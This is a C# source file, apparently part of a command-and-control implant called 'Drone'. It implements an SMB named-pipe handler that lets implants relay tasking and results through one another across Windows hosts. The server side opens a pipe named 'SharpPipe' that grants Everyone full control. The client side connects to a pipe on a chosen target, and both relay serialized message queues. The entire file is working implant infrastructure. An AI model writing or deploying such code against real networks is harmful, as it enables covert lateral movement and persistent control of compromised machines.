using System;
using System.IO;
using System.IO.Pipes;
using System.Linq;
using System.Security.AccessControl;
using System.Security.Principal;
using System.Threading;
using System.Threading.Tasks;

using Drone.Invocation.DynamicInvoke;
using Drone.Models;

namespace Drone.Handlers
{
    public class DefaultSmbHandler : Handler
    {
        public override string Name { get; } = "default-smb";

        private readonly HandlerMode _mode;
        private readonly string _target;
        
        private CancellationTokenSource _tokenSource;

        private NamedPipeServerStream _pipeServer;
        private NamedPipeClientStream _pipeClient;

        public DefaultSmbHandler()
        {
            _mode = HandlerMode.Server;
        }

        public DefaultSmbHandler(string target)
        {
            _mode = HandlerMode.Client;
            _target = target;
        }
        
        public override async Task Start()
        {
            _tokenSource = new CancellationTokenSource();
            
            switch (_mode)
            {
                case HandlerMode.Client:
                {
                    _pipeClient = new NamedPipeClientStream(_target, PipeName);
                    
                    // blocks until connected, we give it 5 seconds before aborting
                    var token = new CancellationTokenSource(new TimeSpan(0, 0, 5));
                    await _pipeClient.ConnectAsync(token.Token);
                    await RunReadWriteLoop(_pipeClient);
                    break; 
                }

                case HandlerMode.Server:
                {
                    // setup pipe server
                    var ps = new PipeSecurity();
                    var identity = new SecurityIdentifier(WellKnownSidType.WorldSid, null);
                    ps.AddAccessRule(new PipeAccessRule(identity, PipeAccessRights.FullControl, AccessControlType.Allow));
            
                    _pipeServer = new NamedPipeServerStream(PipeName, PipeDirection.InOut, NamedPipeServerStream.MaxAllowedServerInstances, PipeTransmissionMode.Byte, PipeOptions.Asynchronous, 1024, 1024, ps);
                    
                    // blocks until connection is received
                    await _pipeServer.WaitForConnectionAsync();
                    await RunReadWriteLoop(_pipeServer);
                    break;
                }
                
                default:
                    throw new ArgumentOutOfRangeException();
            }
        }

        private async Task RunReadWriteLoop(PipeStream pipeStream)
        {
            // put reads and writes in separate tasks
            
            var readTask = Task.Run(async () =>
            {
                while (!_tokenSource.IsCancellationRequested)
                {
                    var inbound = await ReadFromStream(pipeStream);
                    
                    if (inbound is null || inbound.Length == 0)
                    {
                        await Task.Delay(1000);
                        continue;
                    }
                    
                    var envelopes = inbound.Deserialize<MessageEnvelope[]>();
                
                    if (envelopes.Any())
                        foreach (var envelope in envelopes)
                            InboundQueue.Enqueue(envelope);

                    await Task.Delay(1000);
                }
                
            }, _tokenSource.Token);

            var writeTask = Task.Run(async () =>
            {
                while (!_tokenSource.IsCancellationRequested)
                {
                    if (OutboundQueue.IsEmpty)
                    {
                        await Task.Delay(1000);
                        continue;
                    }

                    var outbound = GetOutboundQueue().ToArray();
                    var raw = outbound.Serialize();
                    await WriteToStream(pipeStream, raw);
                }
                
            }, _tokenSource.Token);

            // block whilst tasks are running
            await Task.WhenAll(readTask, writeTask);
        }

        private static async Task<byte[]> ReadFromStream(PipeStream pipeStream)
        {
            var pipeHandle = pipeStream.SafePipeHandle.DangerousGetHandle();
            
            using var ms = new MemoryStream();
            
            uint bytes = 0;

            do
            {
                Win32.Kernel32.PeekNamedPipe(pipeHandle, ref bytes);
                if (bytes == 0) break;

                var buf = new byte[bytes];
                var read = await pipeStream.ReadAsync(buf, 0, (int)bytes);
                await ms.WriteAsync(buf, 0, read);
            }
            while (bytes > 0);

            return ms.ToArray();
        }

        private static async Task WriteToStream(PipeStream pipeStream, byte[] data)
        {
            await pipeStream.WriteAsync(data, 0, data.Length);
        }

        public override void Stop()
        {
            _tokenSource.Cancel();

            switch (_mode)
            {
                case HandlerMode.Client:
                    _pipeClient.Dispose();
                    break;
                
                case HandlerMode.Server:
                    _pipeServer.Dispose();
                    break;
                
                default:
                    throw new ArgumentOutOfRangeException();
            }
        }

        private static string PipeName => "SharpPipe";
    }
}